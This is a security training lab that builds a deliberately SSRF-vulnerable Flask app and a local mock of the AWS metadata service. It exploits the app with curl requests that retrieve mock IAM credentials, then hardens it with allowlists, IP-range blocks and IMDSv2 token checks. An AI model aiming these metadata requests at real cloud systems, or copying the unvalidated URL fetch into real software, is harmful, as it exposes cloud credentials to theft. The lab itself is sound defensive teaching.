# Lab — SSRF to IMDS Exploitation and Fix

> **Prereqs:** `../ssrf-and-cloud-metadata-from-app.md`, `../Network-Security/ssrf-and-imds-pivots.md`
> **Time:** ~30 minutes
> **Cost:** None (all local)
> **Authorization scope:** Run entirely on your laptop. No cloud account needed. The IMDS mock runs locally. No production targeting.

## Overview

You will:
1. Build a vulnerable Flask app that fetches user-supplied URLs
2. Run a local mock of the AWS IMDSv1 endpoint on `169.254.169.254`
3. Exploit the SSRF to retrieve mock credentials
4. Fix the app with URL allowlist validation + IMDSv2 enforcement simulation
5. Confirm the exploit no longer works

## Prerequisites

```bash
pip3 install flask requests
```

## Step 1: Create the IMDS mock

The AWS EC2 metadata service listens on the link-local address `169.254.169.254:80`. We'll mock a simplified IMDSv1 that returns fake but realistic credential data.

Create a loopback alias so the mock can bind to `169.254.169.254` on your laptop:

```bash
# macOS
sudo ifconfig lo0 alias 169.254.169.254/32 up

# Linux
sudo ip addr add 169.254.169.254/32 dev lo
```

Create `imds-mock.py`:

```python
#!/usr/bin/env python3
"""Mock IMDSv1 server — returns fake credentials to simulate the attack."""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class IMDSMock(BaseHTTPRequestHandler):
    def _send(self, code, body, content_type='text/plain'):
        self.send_response(code)
        self.send_header('Content-Type', content_type)
        self.send_header('Server', 'EC2ws')
        self.end_headers()
        if isinstance(body, str):
            body = body.encode()
        self.wfile.write(body)

    def do_GET(self):
        # IMDSv1 — no token required
        if self.path == '/latest/meta-data/':
            self._send(200, 'iam/\nsecurity-groups/\ninstance-id\n')
        elif self.path == '/latest/meta-data/iam/':
            self._send(200, 'security-credentials/\ninfo/\n')
        elif self.path == '/latest/meta-data/iam/security-credentials/':
            self._send(200, 'sandbox-app-role\n')
        elif self.path == '/latest/meta-data/iam/security-credentials/sandbox-app-role':
            creds = {
                "Code": "Success",
                "LastUpdated": "2026-06-22T10:00:00Z",
                "Type": "AWS-HMAC",
                "AccessKeyId": "ASIAXXXXXXXXXXXXXX01",
                "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "Token": "FQoGZXIvYXdzEIN//////////wEaDFakeToken...",
                "Expiration": "2026-06-22T16:00:00Z"
            }
            self._send(200, json.dumps(creds, indent=2), 'application/json')
        elif self.path == '/latest/meta-data/instance-id':
            self._send(200, 'i-0a1b2c3d4e5f67890\n')
        elif self.path == '/latest/api/token':
            # IMDSv2 token endpoint — PUT request would get token
            # For this lab, we return a token on GET as well (simplified)
            self._send(200, 'MOCK-IMDSv2-TOKEN-abcdef123456==')
        else:
            self._send(404, f'Not found: {self.path}')

    def do_PUT(self):
        if self.path == '/latest/api/token':
            ttl = self.headers.get('X-aws-ec2-metadata-token-ttl-seconds', '21600')
            self._send(200, 'MOCK-IMDSv2-TOKEN-abcdef123456==')
        else:
            self._send(404, 'Not found')

    def log_message(self, format, *args):
        print(f'[IMDS-MOCK] {self.client_address[0]} — {format % args}')

if __name__ == '__main__':
    server = HTTPServer(('169.254.169.254', 80), IMDSMock)
    print('IMDS mock listening on 169.254.169.254:80')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\nShutting down...')
        server.server_close()
```

Run the mock in a terminal:

```bash
sudo python3 imds-mock.py
```

Verify:

```bash
curl http://169.254.169.254/latest/meta-data/
# Should print: iam/ security-groups/ instance-id
```

## Step 2: Build the vulnerable app

Create `vulnerable-app.py`:

```python
#!/usr/bin/env python3
"""Vulnerable Flask app — fetches user-supplied URLs without validation."""

from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch')
def fetch():
    url = request.args.get('url', '')

    if not url:
        return '<h3>Usage: /fetch?url=&lt;URL&gt;</h3>', 400

    try:
        resp = requests.get(url, timeout=5, allow_redirects=True)
        return f'<pre>Status: {resp.status_code}\n\n{resp.text[:1000]}</pre>'
    except requests.exceptions.RequestException as e:
        return f'<pre>Error: {e}</pre>', 502
    except Exception as e:
        return f'<pre>Error: {e}</pre>', 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

Run the app:

```bash
python3 vulnerable-app.py
```

## Step 3: Exploit

In a browser or `curl`:

```bash
# Step 3a: Discover the IMDS root
curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/"

# Output should include "iam/"

# Step 3b: Enumerate IAM roles
curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Output: "sandbox-app-role"

# Step 3c: Retrieve the credentials (THE EXPLOIT)
curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/sandbox-app-role"

# Output: fake credentials JSON — in real AWS, these would be REAL STS credentials
```

**Expected output (Step 3c):**

```json
{
  "Code": "Success",
  "LastUpdated": "2026-06-22T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAXXXXXXXXXXXXXX01",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FQoGZXIvYXdzEIN//////////wEaDFakeToken...",
  "Expiration": "2026-06-22T16:00:00Z"
}
```

The attacker now has credentials. In a real cloud scenario, these would be used with `aws sts get-caller-identity` and then to enumerate the AWS account.

## Step 4: Add allowlist validation

Create `fixed-app.py`:

```python
#!/usr/bin/env python3
"""Fixed Flask app — URL allowlist + blocked internal hosts."""

from flask import Flask, request
from urllib.parse import urlparse
import ipaddress
import socket
import requests

app = Flask(__name__)

ALLOWED_SCHEMES = {'https'}
ALLOWED_DOMAINS = {'jsonplaceholder.typicode.com', 'httpbin.org'}

BLOCKED_PREFIXES = [ipaddress.ip_network(n) for n in [
    '169.254.0.0/16',   # Link-local (IMDS!)
    '127.0.0.0/8',      # Loopback
    '10.0.0.0/8',       # RFC 1918
    '172.16.0.0/12',    # RFC 1918
    '192.168.0.0/16',   # RFC 1918
    '::1/128',          # IPv6 loopback
    'fc00::/7',         # IPv6 unique local
]]

def is_safe_url(url: str) -> tuple[bool, str]:
    try:
        parsed = urlparse(url)
    except Exception:
        return False, 'Failed to parse URL'

    if parsed.scheme not in ALLOWED_SCHEMES:
        return False, f'Scheme "{parsed.scheme}" not allowed. Use HTTPS only.'

    if parsed.hostname not in ALLOWED_DOMAINS:
        return False, f'Domain "{parsed.hostname}" not in allowlist.'

    # DNS rebinding protection: resolve and check IP
    try:
        addrs = socket.getaddrinfo(parsed.hostname, parsed.port or 443)
        for addr in addrs:
            ip = ipaddress.ip_address(addr[4][0])
            for blocked in BLOCKED_PREFIXES:
                if ip in blocked:
                    return False, f'Resolved IP {ip} is in blocked range {blocked}'
    except socket.gaierror:
        return False, f'Cannot resolve hostname: {parsed.hostname}'

    return True, 'ok'

@app.route('/fetch')
def fetch():
    url = request.args.get('url', '')
    if not url:
        return '<h3>Usage: /fetch?url=&lt;URL&gt;</h3>', 400

    safe, reason = is_safe_url(url)
    if not safe:
        return f'<pre>Blocked: {reason}</pre>', 403

    try:
        resp = requests.get(url, timeout=5, allow_redirects=False)
        return f'<pre>Status: {resp.status_code}\n\n{resp.text[:1000]}</pre>'
    except Exception as e:
        return f'<pre>Error: {e}</pre>', 502

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)
```

Run the fixed app:

```bash
python3 fixed-app.py
```

## Step 5: Re-attempt — confirm fix

```bash
# Attempt the IMDS fetch again — should be blocked
curl "http://localhost:5001/fetch?url=http://169.254.169.254/latest/meta-data/"

# Expected: "Blocked: Scheme "http" not allowed. Use HTTPS only."

# Even if attacker uses a redirector, the IP check catches it
curl "http://localhost:5001/fetch?url=https://attacker.example.com/redirect?to=http://169.254.169.254/latest/meta-data/"

# Expected: "Blocked: Domain "attacker.example.com" not in allowlist."

# Allowed domains work normally
curl "http://localhost:5001/fetch?url=https://httpbin.org/get"

# Expected: HTTP response from httpbin.org
```

## Step 6: Simulate IMDSv2 enforcement

Modify the IMDS mock to enforce IMDSv2 by checking for the token header for credential endpoints. Create `imds-mock-v2.py`:

```python
#!/usr/bin/env python3
"""Mock IMDS with v2 enforcement — credential endpoints require token."""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json

VALID_TOKENS = set()

class IMDSv2Mock(BaseHTTPRequestHandler):
    def _send(self, code, body, content_type='text/plain'):
        self.send_response(code)
        self.send_header('Content-Type', content_type)
        self.send_header('Server', 'EC2ws')
        self.end_headers()
        if isinstance(body, str):
            body = body.encode()
        self.wfile.write(body)

    def do_PUT(self):
        if self.path == '/latest/api/token':
            ttl = self.headers.get('X-aws-ec2-metadata-token-ttl-seconds', '21600')
            token = 'v2-TOKEN-' + ''.join(f'{b:02x}' for b in b'fake') + '=='
            VALID_TOKENS.add(token)
            self._send(200, token)
        else:
            self._send(404, 'Not found')

    def do_GET(self):
        # Check for credential paths — require token
        if '/iam/security-credentials/' in self.path and self.path != '/latest/meta-data/iam/security-credentials/':
            token = self.headers.get('X-aws-ec2-metadata-token', '')
            if token not in VALID_TOKENS:
                self._send(401, 'IMDSv2 token required. PUT to /latest/api/token first.')
                return

        if self.path == '/latest/meta-data/':
            self._send(200, 'iam/\nsecurity-groups/\ninstance-id\n')
        elif self.path == '/latest/meta-data/iam/security-credentials/':
            self._send(200, 'sandbox-app-role\n')
        elif self.path == '/latest/meta-data/iam/security-credentials/sandbox-app-role':
            creds = {
                "Code": "Success",
                "AccessKeyId": "ASIAXXXXXXXXXXXXXX02",
                "SecretAccessKey": "v2PROTECTEDk7MDENG/bPxRfiCYEXAMPLEKEY",
                "Token": "v2-FQoGZXIvYXdzE...",
                "Expiration": "2026-06-22T16:00:00Z"
            }
            self._send(200, json.dumps(creds, indent=2), 'application/json')
        else:
            self._send(404, f'Not found: {self.path}')

    def log_message(self, format, *args):
        print(f'[IMDSv2] {self.client_address[0]} — {format % args}')

if __name__ == '__main__':
    server = HTTPServer(('169.254.169.254', 80), IMDSv2Mock)
    print('IMDSv2 mock listening on 169.254.169.254:80 (token required for creds)')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\nShutting down...')
        server.server_close()
```

Stop the v1 mock and start the v2 mock:

```bash
sudo python3 imds-mock-v2.py
```

Test v2 flow:

```bash
# v1-style request (no token) → rejected
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/sandbox-app-role
# Expected: 401 — IMDSv2 token required

# v2 flow: get token first, then request
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/sandbox-app-role
# Expected: credential JSON
```

## Teardown

```bash
# Stop the Flask apps (Ctrl+C in their terminals)
# Stop the IMDS mock (Ctrl+C)

# Remove the loopback alias
# macOS:
sudo ifconfig lo0 -alias 169.254.169.254

# Linux:
sudo ip addr del 169.254.169.254/32 dev lo
```

## What you learned

1. SSRF from a user-supplied URL parameter reaches the IMDS endpoint because the app's outbound HTTP has no restrictions.
2. The fix layers:
   - **Scheme allowlist** — HTTPS only, blocking `http://169.254.169.254`
   - **Domain allowlist** — explicit approved hosts only
   - **IP-range block** — DNS rebinding protection against blocked prefixes (RFC 1918, link-local)
   - **IMDSv2** — a second layer: even if the app leaks, credentials require a pre-fetched token
3. A real production fix combines all layers: app-level allowlist + IMDSv2 enforcement + minimal IAM role + SCP conditions.

## References

- Full lesson: `../ssrf-and-cloud-metadata-from-app.md`
- Detection rules: `../detections/ssrf-metadata-detection.md`
- Network-level IMDS defense: `../../Network-Security/ssrf-and-imds-pivots.md`
